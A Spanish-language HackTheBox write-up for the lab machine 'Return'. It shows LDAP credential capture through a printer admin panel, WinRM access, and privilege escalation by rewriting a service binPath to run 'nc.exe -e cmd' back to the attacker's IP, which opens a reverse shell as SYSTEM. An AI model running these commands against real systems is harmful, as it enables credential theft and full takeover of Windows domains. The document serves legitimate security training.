---
title: "Return - HTB Writeup"
layout: single
excerpt: "Return es una máquina de dificultad fácil de la plataforma de HackTheBox. Para obtener acceso inicial nos aprovechamos de unas credenciales de LDAP obtenidas a partir de admin panel para conectarnos con WinRM. Para escalar privilegios al usuario administrador, abusamos de los permisos del grupo Server Operators"
show_date: true
classes: wide
toc: true
toc_label: "Content"
toc_icon: "fire"
toc_sticky: false
header:
  teaser: https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/7265839e-f382-4d27-91fb-f76e817413f0
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/67548295/191989683-8e498bfd-d8dd-4e45-b929-f557100f9648.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - AD
  - LDAP
  - Windows
  - WinRM
---

![Return](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/9de44b86-783b-4265-8947-e93eb7b2bfda)

# Recon
Comenzamos enumerando los puertos con la herramienta `nmap`:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.11.108 -sC -sV -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-02 10:19 WEST
Nmap scan report for 10.10.11.108
Host is up (0.054s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-02 09:38:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m32s
| smb2-time: 
|   date: 2023-07-02T09:39:38
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.66 seconds
```

 Parámetro | Explícación |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', para agilizar el escaneo ya que este valida el estado de un puerto solo con el primer paso del handshake TCP. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido |
| `-sC` | Utiliza un escaneo con una serie de scripts de enumeración por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados del escaneo en formato normal, tal cual se ve en el escaneo. |

Vemos que tenemos abiertos muchos puertos donde mirar, pero en estos casos se suele empezar a enumerar por el puerto **80/tcp**. El puerto **5985/tcp** que pertenece al servicio **WinRM** está abierto, asi que será algo a probar si encontramos credenciales.

# User.txt
## Port 80
Visitamos la web alojada en el puerto 80 con el navegador y vemos lo siguiente:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/934289d4-5e0f-4e7c-a59f-7c5a9df5d08d)

Parece ser un panel de administración de impresoras.
Al hacer [hovering](https://my.wlu.edu/its/how-to/safe-computing-hover-technique){:target="\_blank"}{:rel="noopener nofollow"} sobre los enlaces de arriba veo que todos no llevan a nada excepto el enlace **Home** (que es la página principal donde estamos) y el enlace **Settings**.
Accedo a este último y nos encontramos con este formulario:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/b3a140e7-d3a0-4a52-92bb-a56c72a952f0)

## Found creds
Parece haber una contraseña en el campo **Password** pero al ver el código fuente de la página vemos que son `*******` literalmente:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/dd9ce9c3-4a54-4a75-a1f8-e811ce0cd9d5)

Abro la pestaña de **Network** del menú de desarrollador del navegador (F12) para ver que se tramita al pulsar el botón `Update` y vemos lo siguiente:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/017999a7-6c03-4da2-b058-4a557ed56dee)

Lo único que se envía del formulario es el valor del campo **Server Address**. Pruebo a editar este campo y pongo mi **IP local** de la VPN, me pongo en escucha por el puerto que aparece en el formulario (389 que es el puerto por defecto de LDAP) y le doy de nuevo al botón `Update` y nos llega algo:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ sudo nc -lvp 389
[sudo] password for z3r0byte: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::389
Ncat: Listening on 0.0.0.0:389
Ncat: Connection from 10.10.11.108.
Ncat: Connection from 10.10.11.108:62131.
0*`%return\svc-printer�
                       1edFg43012!!
```
Nos llega lo que parece ser unas credenciales. Esto también se puede llevar a cabo con la herramiento **Responder**:
```bash
┌──[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[...]


[+] Listening for events...

[LDAP] Cleartext Client   : 10.10.11.108
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```
Esta herramienta parsea las credenciales.

### Cred test
Ahora, para verificar si son credenciales válidas, lo podemos hacer con **crackmapexec** autenticandonos frente al protocolo **SMB**:
```bash
❯ cme smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!!
```

Son credenciales válidas.
Probemos ahora a autenticarnos frente al servicio WinRM que vimos anteriormente, por suerte **crackmapexec** tiene un modulo para esto:
```bash
❯ cme winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB         10.10.11.108    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman
WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```
### Acceso inicial
Como vemos, pone `Pwn3d!`, esto significa que podemos acceer a la máquina como este usuario con **evil-winrm**:
```text
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ evil-winrm -i 10.10.11.108 -u "svc-printer" -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.5
                                        index
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

La primera flag, `user.txt`, la podríamos ver en este punto con el siguiente comando:
```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents> type C:\Users\svc-printer\Desktop\user.txt
<REDACTED>
```
ㅤㅤㅤㅤㅤㅤ  
# Root.txt
## System recon
Comienzo enumerando el usuario actual con el comando `whoami /all`:
```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /all

USER INFORMATION
----------------

User Name          SID
================== =============================================
return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
Entre los grupos al que pertenece este usuario, tenemos el `Server Operators`. Si lo buscamos en la web veremos algo que nos llamará la atención:
## Server Operators Privesc
![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/2bd383ff-9adb-43c1-a532-a27b1704bebe)

Al parecer podemos aprovechar los permisos de este grupo para escalar privilegios al usuario administrador.

Para ello tendremos que alterar un servicio privilegiado para cambiar el **binpath** al comando que queramos. Luego reiniciaremos el servicio y el comando se ejecutará como administrador.

### Listing valid services to privesc
El primer paso será listar los servicios con el comando `services`:
```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc
```

Para ver que servicios podemos modificar, tendremos que usar el comando `sc.exe sdshow <service> [showrights]` para ver el [SDDL](https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/) del servicio y saber que podemos hacer con él.
Tendremos que hacer esto ya que no tenemos permisos para ejecutar el comando `sc.exe query`.
```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe query
[SC] OpenSCManager FAILED 5:

Access is denied.
```

En este caso yo ya he mirado y se que tenemos permisos para **editar** la configuración, **parar** y **arrancar** el servicio `VMTools`:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/3c333ecf-44e0-46e9-97ca-46aaece320a9)

Este servicio es válido para escalar privilegios.

### Getting a reverse shell

Primero tendremos que subir el binario `nc.exe` a la máquina, `evil-winrm` tiene una función integrada llamada `upload`, así que simplemente movemos el binario a la ruta donde iniciamos el comando `evil-winrm`y lo subimos o simplemente retrocedemos varios directorios y ponemos la ruta absoluta del binario `nc.exe` como hice en mi caso:
```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload ../../../../../../../opt/SecLists-master/Web-Shells/FuzzDB/nc.exe
                                        
Info: Uploading /home/z3r0byte/Descargas/../../../../../../../opt/SecLists-master/Web-Shells/FuzzDB/nc.exe to C:\Users\svc-printer\Documents\nc.exe
                                        
Data: 37544 bytes of 37544 bytes copied
                                        
Info: Upload successful!
```

Ahora tendremos que editar el **binpath** del servicio que miramos anteriormente para introducir nuestro payload de reverse shell:
```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VMTools binPath="C:\Windows\System32\cmd.exe /c C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.23 9001"
[SC] ChangeServiceConfig SUCCESS
```
Por último, nos pondremos en escucha en nuestra máquina, reiniciamos el servicio y debería de llegar una reverse shell a nuestro equipo:

- Pararíamos el servicio si estuviera activo (en este caso no)

```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop VMTools
[SC] ControlService FAILED 1062:

The service has not been started.
```

Y ahora lo iniciariamos de nuevo para obtener una reverse shell:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/8d93afa6-197d-4346-8bda-7d278daa1810)

## nt authority\system
¡Y ya somos administradores!
```text
C:\Windows\system32> whoami
nt authority\system
```

Por último nos quedaría obtener la flag `root.txt`:
```text
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
<REDACTED>
```

